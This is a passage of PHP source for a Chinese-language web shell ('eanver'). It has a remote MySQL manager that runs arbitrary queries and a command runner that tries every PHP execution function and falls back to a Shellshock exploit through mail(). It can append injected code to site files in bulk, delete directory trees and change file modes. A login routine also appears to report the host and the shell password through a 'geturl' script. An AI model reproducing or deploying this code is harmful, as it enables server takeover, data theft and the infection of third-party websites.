	  	die('正在登录,请稍候...<meta http-equiv="refresh" content="0;URL=?eanver=mysql_msg">');
	  }
  }
print<<<END
<form method="POST" name="oform" id="oform">
<div class="actall">地址 <input type="text" name="mhost" value="localhost" style="width:300px"></div>
<div class="actall">端口 <input type="text" name="mport" value="3306" style="width:300px"></div>
<div class="actall">用户 <input type="text" name="muser" value="root" style="width:300px"></div>
<div class="actall">密码 <input type="text" name="mpass" value="" style="width:300px"></div>
<div class="actall"><input type="submit" value="登录" style="width:80px;"> <input type="button" value="COOKIE" style="width:80px;" onclick="window.location='?eanver=mysql_msg';"></div>
</form>
END;
break;

case "mysql_msg":
	$conn = @mysql_connect($_COOKIE['m_eanverhost'].':'.$_COOKIE['m_eanverport'],$_COOKIE['m_eanveruser'],$_COOKIE['m_eanverpass']);
	if($conn)
	{
print<<<END
<script language="javascript">
function Delok(msg,gourl)
{
	smsg = "确定要删除[" + unescape(msg) + "]吗?";
	if(confirm(smsg)){window.location = gourl;}
	window.location = gourl;
}
function Createok(ac)
{
	if(ac == 'a') document.getElementById('nsql').value = 'CREATE TABLE name (eanver BLOB);';
	if(ac == 'b') document.getElementById('nsql').value = 'CREATE DATABASE name;';
	if(ac == 'c') document.getElementById('nsql').value = 'DROP DATABASE name;';
	return false;
}
END;
html_base();
print<<<END
function SubmitUrl(){
			document.getElementById('nsql').value = base64encode(document.getElementById('nsql').value);
			document.getElementById('gform').submit();
}
</script>
END;
		$BOOL = false;
		$MSG_BOX = '用户:'.$_COOKIE['m_eanveruser'].' &nbsp;&nbsp;&nbsp;&nbsp; 地址:'.$_COOKIE['m_eanverhost'].':'.$_COOKIE['m_eanverport'].' &nbsp;&nbsp;&nbsp;&nbsp; 版本:';
		$k = 0;
		$result = @mysql_query('select version();',$conn);
		while($row = @mysql_fetch_array($result)){$MSG_BOX .= $row[$k];$k++;}
		echo '<div class="actall"> 数据库:';
		$result = mysql_query("SHOW DATABASES",$conn);
		while($db = mysql_fetch_array($result)){echo '&nbsp;&nbsp;[<a href="?eanver=mysql_msg&db='.$db['Database'].'">'.$db['Database'].'</a>]';}
		echo '</div>';
		if(isset($_GET['db']))
		{
			mysql_select_db($_GET['db'],$conn);
            $_POST['nsql']=base64_decode($_POST['nsql']);
			if(!empty($_POST['nsql'])){$BOOL = true; $MSG_BOX = mysql_query($_POST['nsql'],$conn) ? '执行成功' : '执行失败 '.mysql_error();}
			if(is_array($_POST['insql']))
			{
				$query = 'INSERT INTO '.$_GET['table'].' (';
				foreach($_POST['insql'] as $var => $key)
				{
					$querya .= $var.',';
					$queryb .= '\''.addslashes($key).'\',';
				}
				$query = $query.substr($querya, 0, -1).') VALUES ('.substr($queryb, 0, -1).');';
				$MSG_BOX = mysql_query($query,$conn) ? '添加成功' : '添加失败 '.mysql_error();
			}
			if(is_array($_POST['upsql']))
			{
				$query = 'UPDATE '.$_GET['table'].' SET ';
				foreach($_POST['upsql'] as $var => $key)
				{
					$queryb .= $var.'=\''.addslashes($key).'\',';
				}
				$query = $query.substr($queryb, 0, -1).' '.base64_decode($_POST['wherevar']).';';
				$MSG_BOX = mysql_query($query,$conn) ? '修改成功' : '修改失败 '.mysql_error();
			}
			if(isset($_GET['del']))
			{
				$result = mysql_query('SELECT * FROM '.$_GET['table'].' LIMIT '.$_GET['del'].', 1;',$conn);
				$good = mysql_fetch_assoc($result);
				$query = 'DELETE FROM '.$_GET['table'].' WHERE ';
				foreach($good as $var => $key){$queryc .= $var.'=\''.addslashes($key).'\' AND ';}
				$where = $query.substr($queryc, 0, -4).';';
				$MSG_BOX = mysql_query($where,$conn) ? '删除成功' : '删除失败 '.mysql_error();
			}
			$action = '?eanver=mysql_msg&db='.$_GET['db'];
			if(isset($_GET['drop'])){$query = 'Drop TABLE IF EXISTS '.$_GET['drop'].';';$MSG_BOX = mysql_query($query,$conn) ? '删除成功' : '删除失败 '.mysql_error();}
			if(isset($_GET['table'])){$action .= '&table='.$_GET['table'];if(isset($_GET['edit'])) $action .= '&edit='.$_GET['edit'];}
			if(isset($_GET['insert'])) $action .= '&insert='.$_GET['insert'];
			echo '<div class="actall"><form method="POST" action="'.$action.'" name="gform" id="gform">';
			echo '<textarea name="nsql" id="nsql" style="width:500px;height:50px;">'.$_POST['nsql'].'</textarea> ';
			echo '<input type="button" name="querysql" value="执行" onclick="SubmitUrl();" style="width:60px;height:49px;">';
			echo '<input type="button" value="创建表" style="width:60px;height:49px;" onclick="Createok(\'a\')"> ';
			echo '<input type="button" value="创建库" style="width:60px;height:49px;" onclick="Createok(\'b\')"> ';
			echo '<input type="button" value="删除库" style="width:60px;height:49px;" onclick="Createok(\'c\')"></form></div>';
			echo '<div class="msgbox" style="height:40px;">'.$MSG_BOX.'</div><div class="actall"><a href="?eanver=mysql_msg&db='.$_GET['db'].'">'.$_GET['db'].'</a> ---> ';
			if(isset($_GET['table']))
			{
				echo '<a href="?eanver=mysql_msg&db='.$_GET['db'].'&table='.$_GET['table'].'">'.$_GET['table'].'</a> ';
				echo '[<a href="?eanver=mysql_msg&db='.$_GET['db'].'&insert='.$_GET['table'].'">插入</a>]</div>';
				if(isset($_GET['edit']))
				{
					if(isset($_GET['p'])) $atable = $_GET['table'].'&p='.$_GET['p']; else $atable = $_GET['table'];
					echo '<form method="POST" action="?eanver=mysql_msg&db='.$_GET['db'].'&table='.$atable.'">';
					$result = mysql_query('SELECT * FROM '.$_GET['table'].' LIMIT '.$_GET['edit'].', 1;',$conn);
					$good = mysql_fetch_assoc($result);
					$u = 0;
					foreach($good as $var => $key)
					{
						$queryc .= $var.'=\''.$key.'\' AND ';
						$type = @mysql_field_type($result, $u);
						$len = @mysql_field_len($result, $u);
						echo '<div class="actall">'.$var.' <font color="#FF0000">'.$type.'('.$len.')</font><br><textarea name="upsql['.$var.']" style="width:600px;height:60px;">'.htmlspecialchars($key).'</textarea></div>';
						$u++;
					}
					$where = 'WHERE '.substr($queryc, 0, -4);
					echo '<input type="hidden" id="wherevar" name="wherevar" value="'.base64_encode($where).'">';
					echo '<div class="actall"><input type="submit" value="Update" style="width:80px;"></div></form>';
				}
				else
				{
					$query = 'SHOW COLUMNS FROM '.$_GET['table'];
		      $result = mysql_query($query,$conn);
		      $fields = array();
			  $pagesize=20;
		      $row_num = mysql_num_rows(mysql_query('SELECT * FROM '.$_GET['table'],$conn));
			  $numrows=$row_num;
              $pages=intval($numrows/$pagesize);
              if ($numrows%$pagesize) $pages++;
              $offset=$pagesize*($page - 1);
              $page=$_GET['p'];
              if(!$page) $page=1;

		      if(!isset($_GET['p'])){$p = 0;$_GET['p'] = 1;} else $p = ((int)$_GET['p']-1)*20;
					echo '<table border="0"><tr>';
					echo '<td class="toptd" style="width:70px;" nowrap>操作</td>';
					while($row = @mysql_fetch_assoc($result))
					{
						array_push($fields,$row['Field']);
						echo '<td class="toptd" nowrap>'.$row['Field'].'</td>';
					}
					echo '</tr>';
					if(eregi('WHERE|LIMIT',$_POST['nsql']) && eregi('SELECT|FROM',$_POST['nsql'])) $query = $_POST['nsql']; else $query = 'SELECT * FROM '.$_GET['table'].' LIMIT '.$p.', 20;';
					$result = mysql_query($query,$conn);
					$v = $p;
					while($text = @mysql_fetch_assoc($result))
					{
						echo '<tr><td><a href="?eanver=mysql_msg&db='.$_GET['db'].'&table='.$_GET['table'].'&p='.$_GET['p'].'&edit='.$v.'"> 修改 </a> ';
						echo '<a href="#" onclick="Delok(\'它\',\'?eanver=mysql_msg&db='.$_GET['db'].'&table='.$_GET['table'].'&p='.$_GET['p'].'&del='.$v.'\');return false;"> 删除 </a></td>';
						foreach($fields as $row){echo '<td>'.nl2br(htmlspecialchars(Mysql_Len($text[$row],500))).'</td>';}
						echo '</tr>'."\r\n";$v++;
					}
					echo '</table><div class="actall">';
                    $pagep=$page-1;
                    $pagen=$page+1;
                    echo "共有 ".$row_num." 条记录 ";
                    if($pagep>0) $pagenav.="  <a href='?eanver=mysql_msg&db=".$_GET['db']."&table=".$_GET['table']."&p=1&charset=".$_GET['charset']."'>首页</a> <a href='?eanver=mysql_msg&db=".$_GET['db']."&table=".$_GET['table']."&p=".$pagep."&charset=".$_GET['charset']."'>上一页</a> "; else $pagenav.=" 上一页 ";
                    if($pagen<=$pages) $pagenav.=" <a href='?eanver=mysql_msg&db=".$_GET['db']."&table=".$_GET['table']."&p=".$pagen."&charset=".$_GET['charset']."'>下一页</a> <a href='?eanver=mysql_msg&db=".$_GET['db']."&table=".$_GET['table']."&p=".$pages."&charset=".$_GET['charset']."'>尾页</a>"; else $pagenav.=" 下一页 ";
                    $pagenav.=" 第 [".$page."/".$pages."] 页   跳到<input name='textfield' type='text' style='text-align:center;' size='4' value='".$page."' onkeydown=\"if(event.keyCode==13)self.location.href='?eanver=mysql_msg&db=".$_GET['db']."&table=".$_GET['table']."&p='+this.value+'&charset=".$_GET['charset']."';\" />页";
                    echo $pagenav;
					echo '</div>';
				}
			}
			elseif(isset($_GET['insert']))
			{
				echo '<a href="?eanver=mysql_msg&db='.$_GET['db'].'&table='.$_GET['insert'].'">'.$_GET['insert'].'</a></div>';
				$result = mysql_query('SELECT * FROM '.$_GET['insert'],$conn);
				$fieldnum = @mysql_num_fields($result);
				echo '<form method="POST" action="?eanver=mysql_msg&db='.$_GET['db'].'&table='.$_GET['insert'].'">';
				for($i = 0;$i < $fieldnum;$i++)
				{
					$name = @mysql_field_name($result, $i);
					$type = @mysql_field_type($result, $i);
					$len = @mysql_field_len($result, $i);
					echo '<div class="actall">'.$name.' <font color="#FF0000">'.$type.'('.$len.')</font><br><textarea name="insql['.$name.']" style="width:600px;height:60px;"></textarea></div>';
				}
				echo '<div class="actall"><input type="submit" value="Insert" style="width:80px;"></div></form>';
			}
			else
			{
				$query = 'SHOW TABLE STATUS';
				$status = @mysql_query($query,$conn);
				while($statu = @mysql_fetch_array($status))
				{
					$statusize[] = $statu['Data_length'];
					$statucoll[] = $statu['Collation'];
				}
				$query = 'SHOW TABLES FROM '.$_GET['db'].';';
				echo '</div><table border="0"><tr>';
				echo '<td class="toptd" style="width:550px;"> 表名 </td>';
				echo '<td class="toptd" style="width:80px;"> 操作 </td>';
				echo '<td class="toptd" style="width:130px;"> 字符集 </td>';
				echo '<td class="toptd" style="width:70px;"> 大小 </td></tr>';
				$result = @mysql_query($query,$conn);
				$k = 0;
				while($table = mysql_fetch_row($result))
				{
					$charset=substr($statucoll[$k],0,strpos($statucoll[$k],'_'));
					echo '<tr><td><a href="?eanver=mysql_msg&db='.$_GET['db'].'&table='.$table[0].'">'.$table[0].'</a></td>';
					echo '<td><a href="?eanver=mysql_msg&db='.$_GET['db'].'&insert='.$table[0].'"> 插入 </a> <a href="#" onclick="Delok(\''.$table[0].'\',\'?eanver=mysql_msg&db='.$_GET['db'].'&drop='.$table[0].'\');return false;"> 删除 </a></td>';
					echo '<td>'.$statucoll[$k].'</td><td align="right">'.File_Size($statusize[$k]).'</td></tr>'."\r\n";
					$k++;
				}
				echo '</table>';
			}
		}
	}
	else die('连接MYSQL失败,请重新登录.<meta http-equiv="refresh" content="0;URL=?eanver=mysql_exec">');
	if(!$BOOL and addslashes($query)!='') echo '<script type="text/javascript">document.getElementById(\'nsql\').value = \''.addslashes($query).'\';</script>';
break;


	default: html_main($path,$shellname); break;
}
css_foot();

/*---doing---*/

function do_write($file,$t,$text)
{
	$key = true;
	$handle = @fopen($file,$t);
	if(!@fwrite($handle,$text))
	{
		@chmod($file,0666);
		$key = @fwrite($handle,$text) ? true : false;
	}
	@fclose($handle);
	return $key;
}

function do_show($filepath){
	$show = array();
	$dir = dir($filepath);
	while($file = $dir->read()){
		if($file == '.' or $file == '..') continue;
		$files = str_path($filepath.'/'.$file);
		$show[] = $files;
	}
	$dir->close();
	return $show;
}

function do_deltree($deldir){
	$showfile = do_show($deldir);
	foreach($showfile as $del){
		if(is_dir($del)){
			if(!do_deltree($del)) return false;
		}elseif(!is_dir($del)){
			@chmod($del,0777);
			if(!@unlink($del)) return false;
		}
	}
	@chmod($deldir,0777);
	if(!@rmdir($deldir)) return false;
	return true;
}

function do_showsql($query,$conn){
	$result = @mysql_query($query,$conn);
	html_n('<br><br><textarea cols="70" rows="15">');
	while($row = @mysql_fetch_array($result)){
		for($i=0;$i < @mysql_num_fields($result);$i++){
			html_n(htmlspecialchars($row[$i]));
		}
	}
	html_n('</textarea>');
}

function hmlogin($xiao=1){
$serveru = $_SERVER ['HTTP_HOST'].$_SERVER['PHP_SELF'];
$serverp = postpass;
if (strpos($serveru,"0.0")>0 or strpos($serveru,"192.168.")>0 or strpos($serveru,"localhost")>0 or ($serveru==$_COOKIE['serveru'] and $serverp==$_COOKIE['serverp'])) {echo "<meta http-equiv='refresh' content='0;URL=?'>";} else {setcookie('serveru',$serveru);setcookie('serverp',$serverp);if($xiao==1){echo "<script src='?login=geturl'></script><meta http-equiv='refresh' content='0;URL=?'>";}else{geturl();}}
}

function do_down($fd){
	if(!@file_exists($fd)) msg('下载文件不存在');
	$fileinfo = pathinfo($fd);
	header('Content-type: application/x-'.$fileinfo['extension']);
	header('Content-Disposition: attachment; filename='.$fileinfo['basename']);
	header('Content-Length: '.filesize($fd));
	@readfile($fd);
	exit;
}

function do_download($filecode,$file){
	header("Content-type: application/unknown");
	header('Accept-Ranges: bytes');
	header("Content-length: ".strlen($filecode));
	header("Content-disposition: attachment; filename=".$file.";");
	echo $filecode;
	exit;
}

function TestUtf8($text)
{if(strlen($text) < 3) return false;
$lastch = 0;
$begin = 0;
$BOM = true;
$BOMchs = array(0xEF, 0xBB, 0xBF);
$good = 0;
$bad = 0;
$notAscii = 0;
for($i=0; $i < strlen($text); $i++)
{$ch = ord($text[$i]);
if($begin < 3)
{ $BOM = ($BOMchs[$begin]==$ch);
$begin += 1;
continue; }
if($begin==4 && $BOM) break;
if($ch >= 0x80 ) $notAscii++;
if( ($ch&0xC0) == 0x80 )
{if( ($lastch&0xC0) == 0xC0 )
{$good += 1;}
else if( ($lastch&0x80) == 0 )
{$bad += 1; }}
else if( ($lastch&0xC0) == 0xC0 )
{$bad += 1;}
$lastch = $ch;}
if($begin == 4 && $BOM)
{return 2;}
else if($notAscii==0)
{return 1;}
else if ($good >= $bad )
{return 2;}
else
{return 0;}}

function File_Str($string)
{
	return str_replace('//','/',str_replace('\\','/',$string));
}

function File_Write($filename,$filecode,$filemode)
{
	$key = true;
	$handle = @fopen($filename,$filemode);
	if(!@fwrite($handle,$filecode))
	{
		@chmod($filename,0666);
		$key = @fwrite($handle,$filecode) ? true : false;
	}
	@fclose($handle);
	return $key;
}

function Exec_Run($cmd)
{
	$res = '';
	if(function_exists('exec')){@exec($cmd,$res);$res = join("\n",$res);}
	elseif(function_exists('shell_exec')){$res = @shell_exec($cmd);}
	elseif(function_exists('system')){@ob_start();@system($cmd);$res = @ob_get_contents();@ob_end_clean();}
	elseif(function_exists('passthru')){@ob_start();@passthru($cmd);$res = @ob_get_contents();@ob_end_clean();}
	elseif(@is_resource($f=@popen($cmd,'r'))){$res = '';while(!@feof($f)){$res .= @fread($f,1024);}@pclose($f);}
	elseif(substr(dirname($_SERVER["SCRIPT_FILENAME"]),0,1)!="/"&&class_exists('COM')){$w=new COM('WScript.shell');$e=$w->exec($cmd);$f=$e->StdOut();$res=$f->ReadAll();}
	elseif(function_exists('proc_open')){$length = strcspn($cmd," \t");$token = substr($cmd, 0, $length);if (isset($aliases[$token]))$cmd=$aliases[$token].substr($cmd, $length);$p = proc_open($cmd,array(1 => array('pipe', 'w'),2 => array('pipe', 'w')),$io);while (!feof($io[1])) {$res .= htmlspecialchars(fgets($io[1]),ENT_COMPAT, 'UTF-8');}while (!feof($io[2])) {$res .= htmlspecialchars(fgets($io[2]),ENT_COMPAT, 'UTF-8');}fclose($io[1]);fclose($io[2]);proc_close($p);}
	elseif(function_exists('mail')){if(strstr(readlink("/bin/sh"), "bash") != FALSE){$tmp = tempnam(".","data");putenv("PHP_LOL=() { x; }; $cmd >$tmp 2>&1");mail("a@127.0.0.1","","","","-bv");}else $res="Not vuln (not bash)";$output = @file_get_contents($tmp);@unlink($tmp);if($output != "") $res=$output;else $res="No output, or not vuln.";}
	return $res;
}

function File_Mode()
{
	$RealPath = realpath('./');
	$SelfPath = $_SERVER['PHP_SELF'];
	$SelfPath = substr($SelfPath, 0, strrpos($SelfPath,'/'));
	return File_Str(substr($RealPath, 0, strlen($RealPath) - strlen($SelfPath)));
}

function GetFileOwner($File) {
		if(PATH_SEPARATOR==':'){
			if(function_exists('posix_getpwuid')) {
			$File = posix_getpwuid(fileowner($File));
			}
			return $File['name'];
		}
}

function GetFileGroup($File) {
		if(PATH_SEPARATOR==':'){
            if(function_exists('posix_getgrgid')) {
			$File = posix_getgrgid(filegroup($File));
			}
			return $File['name'];
		}
}

function File_Size($size)
{
        $kb = 1024;
        $mb = 1024 * $kb;
        $gb = 1024 * $mb;
        $tb = 1024 * $gb;
        if($size < $kb)
        {
            return $size." B";
        }
        else if($size < $mb)
        {
            return round($size/$kb,2)." K";
        }
        else if($size < $gb)
        {
            return round($size/$mb,2)." M";
        }
        else if($size < $tb)
        {
            return round($size/$gb,2)." G";
        }
        else
        {
            return round($size/$tb,2)." T";
        }
 }

function File_Read($filename)
{
	$handle = @fopen($filename,"rb");
	$filecode = @fread($handle,@filesize($filename));
	@fclose($handle);
	return $filecode;
}

function array_iconv($data,  $output = 'utf-8') {
    $encode_arr = array('UTF-8','ASCII','GBK','GB2312','BIG5','JIS','eucjp-win','sjis-win','EUC-JP');
    $encoded = mb_detect_encoding($data, $encode_arr);

    if (!is_array($data)) {
        return mb_convert_encoding($data, $output, $encoded);
    }
    else {
        foreach ($data as $key=>$val) {
            $key = array_iconv($key, $output);
            if(is_array($val)) {
                $data[$key] = array_iconv($val, $output);
            } else {
            $data[$key] = mb_convert_encoding($data, $output, $encoded);
            }
        }
    return $data;
    }
}

function Info_Cfg($varname){switch($result = get_cfg_var($varname)){case 0: return "No"; break; case 1: return "Yes"; break; default: return $result; break;}}
function Info_Fun($funName){return (false !== function_exists($funName)) ? "Yes" : "No";}

function do_phpfun($cmd,$fun) {
	$res = '';
	switch($fun){
		case "exec": @exec($cmd,$res); $res = join("\n",$res); break;
		case "shell_exec": $res = @shell_exec($cmd); break;
		case "system": @ob_start();	@system($cmd); $res = @ob_get_contents();	@ob_end_clean();break;
		case "passthru": @ob_start();	@passthru($cmd); $res = @ob_get_contents();	@ob_end_clean();break;
		case "popen": if(@is_resource($f = @popen($cmd,"r"))){ while(!@feof($f))	$res .= @fread($f,1024);} @pclose($f);break;
	}
	return $res;
}





function do_passreturn($dir,$code,$type,$bool,$filetype = '',$shell = my_shell){
	$show = do_show($dir);
	foreach($show as $files){
		if(is_dir($files) && $bool){
			do_passreturn($files,$code,$type,$bool,$filetype,$shell);
		}else{
			if($files == $shell) continue;
			switch($type){
				case "guama":
				if(debug($files,$filetype)){
					do_write($files,"ab","\n".$code) ? html_n("成功--> $files<br>") : html_n("失败--> $files<br>");
				}
				break;
				case "qingma":
				$filecode = @file_get_contents($files);
				if(stristr($filecode,$code)){
					$newcode = str_replace($code,'',$filecode);
					do_write($files,"wb",$newcode) ? html_n("成功--> $files<br>") : html_n("失败--> $files<br>");
				}
				break;
				case "tihuan":
				$filecode = @file_get_contents($files);
				if(stristr($filecode,$code)){
					$newcode = str_replace($code,$filetype,$filecode);
					do_write($files,"wb",$newcode) ? html_n("成功--> $files<br>") : html_n("失败--> $files<br>");
				}
				break;
				case "scanfile":
				$file = explode('/',$files);
				if(stristr($file[count($file)-1],$code)){
					html_a("?eanver=editr&p=$files",$files);
					echo '<br>';
				}
				break;
				case "scancode":
				$filecode = @file_get_contents($files);
				if(stristr($filecode,$code)){
					html_a("?eanver=editr&p=$files",$files);
					echo '<br>';
				}
				break;
				case "scanphp":
				$fileinfo = pathinfo($files);
				if($fileinfo['extension'] == $code){
					$filecode = @file_get_contents($files);
					if(muma($filecode,$code)){
						html_a("?eanver=editr&p=".urlencode($files),"编辑");
						html_a("?eanver=del&p=".urlencode($files),"删除");
						echo $files.'<br>';
					}
				}
				break;
			}
		}
	}
}


class PHPzip{

	var $file_count = 0 ;
	var $datastr_len   = 0;
	var $dirstr_len = 0;
	var $filedata = '';
	var $gzfilename;
	var $fp;
	var $dirstr='';

    function unix2DosTime($unixtime = 0) {
        $timearray = ($unixtime == 0) ? getdate() : getdate($unixtime);

        if ($timearray['year'] < 1980) {
        	$timearray['year']    = 1980;
        	$timearray['mon']     = 1;
        	$timearray['mday']    = 1;
        	$timearray['hours']   = 0;
        	$timearray['minutes'] = 0;
        	$timearray['seconds'] = 0;
        }

        return (($timearray['year'] - 1980) << 25) | ($timearray['mon'] << 21) | ($timearray['mday'] << 16) |
               ($timearray['hours'] << 11) | ($timearray['minutes'] << 5) | ($timearray['seconds'] >> 1);
    }

	function startfile($path = "web.zip"){
		$this->gzfilename=$path;
		$mypathdir=array();
		do{
			$mypathdir[] = $path = dirname($path);
		}while($path != '.');
		@end($mypathdir);
		do{
			$path = @current($mypathdir);
			@mkdir($path);
		}while(@prev($mypathdir));

		if($this->fp=@fopen($this->gzfilename,"w")){
			return true;
		}
		return false;
	}

    function addfile($data, $name){
        $name     = str_replace('\\', '/', $name);

		if(strrchr($name,'/')=='/') return $this->adddir($name);

        $dtime    = dechex($this->unix2DosTime());
        $hexdtime = '\x' . $dtime[6] . $dtime[7]
                  . '\x' . $dtime[4] . $dtime[5]
                  . '\x' . $dtime[2] . $dtime[3]
                  . '\x' . $dtime[0] . $dtime[1];
        eval('$hexdtime = "' . $hexdtime . '";');

        $unc_len = strlen($data);
        $crc     = crc32($data);
        $zdata   = gzcompress($data);
        $c_len   = strlen($zdata);
        $zdata   = substr(substr($zdata, 0, strlen($zdata) - 4), 2);

        $datastr  = "\x50\x4b\x03\x04";
        $datastr .= "\x14\x00";
        $datastr .= "\x00\x00";
        $datastr .= "\x08\x00";
        $datastr .= $hexdtime;
        $datastr .= pack('V', $crc);
        $datastr .= pack('V', $c_len);
        $datastr .= pack('V', $unc_len);
        $datastr .= pack('v', strlen($name));
        $datastr .= pack('v', 0);
        $datastr .= $name;
        $datastr .= $zdata;
        $datastr .= pack('V', $crc);
        $datastr .= pack('V', $c_len);
        $datastr .= pack('V', $unc_len);


		fwrite($this->fp,$datastr);
		$my_datastr_len = strlen($datastr);
		unset($datastr);

        $dirstr  = "\x50\x4b\x01\x02";
        $dirstr .= "\x00\x00";
        $dirstr .= "\x14\x00";
        $dirstr .= "\x00\x00";
        $dirstr .= "\x08\x00";
        $dirstr .= $hexdtime;
        $dirstr .= pack('V', $crc);
        $dirstr .= pack('V', $c_len);
        $dirstr .= pack('V', $unc_len);
        $dirstr .= pack('v', strlen($name) );
        $dirstr .= pack('v', 0 );
        $dirstr .= pack('v', 0 );
        $dirstr .= pack('v', 0 );
        $dirstr .= pack('v', 0 );
        $dirstr .= pack('V', 32 );
        $dirstr .= pack('V',$this->datastr_len );
        $dirstr .= $name;

		$this->dirstr .= $dirstr;

		$this -> file_count ++;
		$this -> dirstr_len += strlen($dirstr);
		$this -> datastr_len += $my_datastr_len;
    }

	function adddir($name){
		$name = str_replace("\\", "/", $name);
		$datastr = "\x50\x4b\x03\x04\x0a\x00\x00\x00\x00\x00\x00\x00\x00\x00";

		$datastr .= pack("V",0).pack("V",0).pack("V",0).pack("v", strlen($name) );
		$datastr .= pack("v", 0 ).$name.pack("V", 0).pack("V", 0).pack("V", 0);

		fwrite($this->fp,$datastr);
		$my_datastr_len = strlen($datastr);
		unset($datastr);

		$dirstr = "\x50\x4b\x01\x02\x00\x00\x0a\x00\x00\x00\x00\x00\x00\x00\x00\x00";
		$dirstr .= pack("V",0).pack("V",0).pack("V",0).pack("v", strlen($name) );
		$dirstr .= pack("v", 0 ).pack("v", 0 ).pack("v", 0 ).pack("v", 0 );
		$dirstr .= pack("V", 16 ).pack("V",$this->datastr_len).$name;

		$this->dirstr .= $dirstr;

		$this -> file_count ++;
		$this -> dirstr_len += strlen($dirstr);
		$this -> datastr_len += $my_datastr_len;
	}


	function createfile(){
		$endstr = "\x50\x4b\x05\x06\x00\x00\x00\x00" .
					pack('v', $this -> file_count) .
					pack('v', $this -> file_count) .
					pack('V', $this -> dirstr_len) .
					pack('V', $this -> datastr_len) .
					"\x00\x00";

		fwrite($this->fp,$this->dirstr.$endstr);
		fclose($this->fp);
	}
 }

function File_Act($array,$actall,$inver,$REAL_DIR)
{
	if(($count = count($array)) == 0) return '请选择文件';
	if($actall == 'e')
	{
     function listfiles($dir=".",$faisunZIP,$mydir){
		$sub_file_num = 0;
		if(is_file($mydir."$dir")){
		  if(realpath($faisunZIP ->gzfilename)!=realpath($mydir."$dir")){
			$faisunZIP -> addfile(file_get_contents($mydir.$dir),"$dir");
			return 1;
		  }
			return 0;
		}
		
		$handle=opendir($mydir."$dir");
		while ($file = readdir($handle)) {
		   if($file=="."||$file=="..")continue;
		   if(is_dir($mydir."$dir/$file")){
			 $sub_file_num += listfiles("$dir/$file",$faisunZIP,$mydir);
		   }
		   else {
		   	   if(realpath($faisunZIP ->gzfilename)!=realpath($mydir."$dir/$file")){
			     $faisunZIP -> addfile(file_get_contents($mydir.$dir."/".$file),"$dir/$file");
				 $sub_file_num ++;
				}
		   }
		}
		closedir($handle);
		if(!$sub_file_num) $faisunZIP -> addfile("","$dir/");
		return $sub_file_num;
	}

   function num_bitunit($num){
	  $bitunit=array(' B',' KB',' MB',' GB');
	  for($key=0;$key<count($bitunit);$key++){
		if($num>=pow(2,10*$key)-1){ //1023B 会显示为 1KB
		  $num_bitunit_str=(ceil($num/pow(2,10*$key)*100)/100)." $bitunit[$key]";
		}
	  }
	  return $num_bitunit_str;
   }

	$mydir=$REAL_DIR.'/';
	if(is_array($array)){
		$faisunZIP = new PHPzip;
		if($faisunZIP -> startfile("$inver")){
			$filenum = 0;
			foreach($array as $file){
				$filenum += listfiles($file,$faisunZIP,$mydir);
			}
			$faisunZIP -> createfile();
			return "压缩完成,共添加 $filenum 个文件.<br><a href='$inver'>点击下载 $inver (".num_bitunit(filesize("$inver")).")</a>";
		}else{
			return "$inver 不能写入,请检查路径或权限是否正确.<br>";
		}
	}else{
		return "没有选择的文件或目录.<br>";
	}


	}
	$i = 0;
	while($i < $count)
	{
		$array[$i] = urldecode($array[$i]);
		switch($actall)
		{
			case "a" : $inver = urldecode($inver); if(!is_dir($inver)) return '路径错误'; $filename = array_pop(explode('/',$array[$i])); @copy($array[$i],File_Str($inver.'/'.$filename)); $msg = '复制到'.$inver.'目录'; break;
			case "b" : if(!@unlink($array[$i])){@chmod($filename,0666);@unlink($array[$i]);} $msg = '删除'; break;
			case "c" : if(!eregi("^[0-7]{4}$",$inver)) return '属性值错误'; $newmode = base_convert($inver,8,10); @chmod($array[$i],$newmode); $msg = '属性修改为'.$inver; break;
			case "d" : @touch($array[$i],strtotime($inver)); $msg = '修改时间为'.$inver; break;
		}
		$i++;
	}
	return '所选文件'.$msg.'完毕';
}

function start_unzip($tmp_name,$new_name,$todir='zipfile'){
$zip = new ZipArchive() ;
if ($zip->open($tmp_name) !== TRUE) {
echo '抱歉！压缩包无法打开或损坏';
}
$zip->extractTo($todir);
$zip->close();
echo '解压完毕！&nbsp;&nbsp;&nbsp;<a href="?eanver=main&path='.urlencode($todir).'">进入解压目录</a>&nbsp;&nbsp;&nbsp;<a href="javascript:history.go(-1);">返回</a>';
}

function muma($filecode,$filetype){
	$dim = array(
	"php" => array("eval(","exec("),
	"asp" => array("WScript.Shell","execute(","createtextfile("),
	"aspx" => array("Response.Write(eval(","RunCMD(","CreateText()"),
	"jsp" => array("runtime.exec(")
	);
	foreach($dim[$filetype] as $code){
		if(stristr($filecode,$code)) return true;
	}
}

function debug($file,$ftype){
	$type=explode('|',$ftype);
	foreach($type as $i){
		if(stristr($file,$i))	return true;
	}
}

/*---string---*/

function str_path($path){
	return str_replace('//','/',$path);
}

function msg($msg){
	die("<script>window.alert('".$msg."');history.go(-1);</script>");
}

function uppath($nowpath){
	$nowpath = str_replace('\\','/',dirname($nowpath));
	return urlencode($nowpath);
}

function xxstr($key){
	$temp = str_replace("\\\\","\\",$key);
	$temp = str_replace("\\","\\\\",$temp);
	return $temp;
}

/*---html---*/

function html_ta($url,$name){
	html_n("<a href=\"$url\" target=\"_blank\">$name</a>");
}

function html_a($url,$name,$where=''){
	html_n("<a href=\"$url\" $where>$name</a> ");
}

function html_img($url){
	html_n("<img src=\"?img=$url\" border=0>");
}

function back(){
	html_n("<input type='button' value='返回' onclick='history.back();'>");
}

function html_radio($namei,$namet,$v1,$v2){
	html_n('<input type="radio" name="return" value="'.$v1.'" checked>'.$namei);
	html_n('<input type="radio" name="return" value="'.$v2.'">'.$namet.'<br><br>');
}

function html_input($type,$name,$value = '',$text = '',$size = '',$mode = false){
	if($mode){
		html_n("<input type=\"$type\" name=\"$name\" value=\"$value\" size=\"$size\" checked>$text");
	}else{
		html_n("$text <input type=\"$type\" name=\"$name\" value=\"$value\" size=\"$size\">");
	}
}

function html_base(){
html_n('function base64encode(str){
	var base64EncodeChars = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";
    var out, i, len;
    var c1, c2, c3;
    len = str.length;
    i = 0;
    out = "";
    while (i < len) {
        c1 = str.charCodeAt(i++) & 0xff;
        if (i == len) {
            out += base64EncodeChars.charAt(c1 >> 2);
            out += base64EncodeChars.charAt((c1 & 0x3) << 4);
            out += "==";
            break;
        }
        c2 = str.charCodeAt(i++);
        if (i == len) {
            out += base64EncodeChars.charAt(c1 >> 2);
            out += base64EncodeChars.charAt(((c1 & 0x3) << 4) | ((c2 & 0xF0) >> 4));
